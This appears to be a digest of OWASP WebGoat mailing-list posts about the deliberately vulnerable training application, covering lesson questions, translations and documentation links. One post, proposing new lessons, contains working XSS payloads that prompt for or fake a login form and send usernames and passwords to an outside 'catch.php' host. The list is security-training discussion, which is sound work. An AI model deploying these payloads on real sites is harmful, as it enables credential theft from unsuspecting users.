Hi ,

trying for it quite long and could not get through. I wanted to give this
challenge to my students. But , before that i want to know how can it be
solved.

Subject: [Owasp-webgoat] Reading other user's messages from WebGoat forum
Message-ID: <4AA78C74.8050100@gmx.ch>

Hello everybody

I have a question about WebGoat. If I post a message in the forum at
Cross-Site Scripting (XSS) / Cross Site Request Forgery (CSFR), is it
possible somehow for other users to read that message as well? For example:
if I log in to webgoat as "guest" and post a message there, is it 
possible for
another user, say, "guest1" to read that message, too?

So far I realized that messages can be read only by the users who 
created them.
Is there some workaround to fix that?

I am using WebGoat version 5.2.

Thank you in advance for your answers

Best regards,
Marco Koster

Hi

I'm trying to run the Http splitting lesson on OS X, but can't inject  
the %0a characters. I copied the inject strings from the solution,  
either with %0d%0a or %0a and I can't get the alert message.

Would anyone have a hint? Is it due to additional protection added to  
FF or OS X?

Thanks

 I would need to go verify this in the code but I'm pretty sure in a shared
WebGoat environment user1 cannot see user2 messages. This was added so user1
could not XSS user2 in a classroom environment.  The logged in username is
stored with the database entry for the posted message and checked upon
message retrieval.

This being said, I'm positive there are other "features" in WebGoat that
would allow you to bypass this check but only a WebGoat source code change
would allow the functionality you've stated.

Dear Sir,

1.     I am assosciated with making a project based on common server-side
application flaws and web application penetration testing techniques by
using WEBGOAT.

2.     I am required to write a lessonto the existing WEBGOAT application
for a new web exploit not existing in the latest version of WEBGOAT
application ver 5.2.

3.     I am sending certain exploits. pl confirm if they can be added as new
lessons.

4.      I have to meet a deadline by 17 Sep 09. Pl reply by due date to
enable us to complete our project.


*NEW LESSONS ON WEBGOAT*

* *

* *

1.*         Password Con XSS:*


<script> username=prompt('Please enter your username',' ');
password=prompt('Please
enter your password',' '); document.write("<img src=\"
http://Project.syndicate3/catch.php?username="+username+"&password="+
password+"\">"); </script>

2.         *More complicated, but better looking XSS password form*:


<div style="position: absolute; width: 30%; z-index: 2; left: 35%; top: 40%;
float:left; background-color:#C0C0C0" id="loginlayer"> <form method="POST"
name="logonf" > <b>You must login to continue</b> <div align="center">
<table border="0" cellspacing="0" cellpadding="0"> <tr> <td>User:</td>
<td><input name="userf" size="20"></td> </tr> <tr> <td>Password:</td>
<td><input type="password" name="passwordf" size="20"></td> </tr> </table>
</div> <p align="center"><input type="button" value="Submit" onClick=
"submitandhide()"></p> </form> <script> function submitandhide() {
document.getElementById("loginlayer").style.display = "none"; temprs =
"user=" + document.logonf.userf.value + "&password=" +
document.logonf.passwordf.value; var iframe = document.createElement(
'IFRAME'); iframe.src = ("http:// Project.syndicate3/catch.php?" + temprs);
document.body.appendChild(iframe); /  } </script> </div>

3.*         Clippy XSS*:


<div style="position:fixed; right:60px; bottom:10px; overflow:visible;" id=
"clippy"> <table valign="top" width="130" height="309" border="0" background
="http://www. Project.syndicate3.com/images/clippy.png" cellpadding="10">

Hi Bo

There is another effort to support WebGoat in German for the lesson plans.
Marek Jawurek has done this work.  There has been much talk about this over
the last two years but no one has taken the lead on an internationalization
effort.  I would very much like to see this happen.  If you would like to
contribute to this project, let me know and I will add you as a
contributor.  Any volunteers to officially lead this activity?

I've cc'd the list. WebGoat at owasp.org is a single account that goes to me.

BTW: I promised Chuck the next release would be before November.  lots of
work to get done before then!

I believe you can do it from the admin functionality.  Login as admin/admin
or maybe it is webgoat/webgoat and there is increased functionality in the
report card.   You can always delete the files user properties files in the
user directory under <tomcat>\webapps\users\<username>.<lesson>.props files
to reset lesson status.

There is documentation at:
http://www.aldeid.com/index.php/OWASP_WebGoatalthough it is in french.
 But the pictures will walk you through the
solution.  The only catch is that the cookie string (for stage 2) might be
base64 encoded depending on the version of webgoat you are using (i.e. I
can't remember if I put that in 5.2 or 5.3)

All

Have you built documentation or solutions for WebGoat?  Have you posted an
in-depth article about WebGoat?

If you answered yes to either of these or if you've added value or
recognition of the OWASP WebGoat project, I would like to add a link to your
stuff on the WebGoat page.  I've added a couple as examples at:
http://code.google.com/p/webgoat/

Please send me the URL of the entry page and I will add it to the WebGoat
project page.

Also, if you have source contributions you would like to see in the WebGoat
5.3 (Estimated November) release please contact me.

Thanks,

Hi Bruce,

My SoC 2008 project is based on WebGoat so I think that would qualify:
http://www.owasp.org/index.php/Category:OWASP_Securing_WebGoat_using_ModSecurity_Project

I will let Ryan Barnett speak for himself - but perhaps he is not on
this list - so here's a link to his Blackhat DC talk on Virtual
Patching which certainly gives recognition to WebGoat:
